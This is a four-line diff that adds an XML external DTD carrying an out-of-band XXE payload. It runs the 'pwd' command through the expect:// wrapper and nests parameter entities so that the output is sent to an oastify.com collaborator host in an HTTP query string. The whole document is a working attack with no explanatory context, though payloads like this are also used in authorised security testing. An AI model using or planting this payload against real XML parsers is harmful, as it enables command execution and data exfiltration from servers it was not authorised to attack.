@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "expect://pwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://cdtu2io75c31ck2onbuetiedy442svgk.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
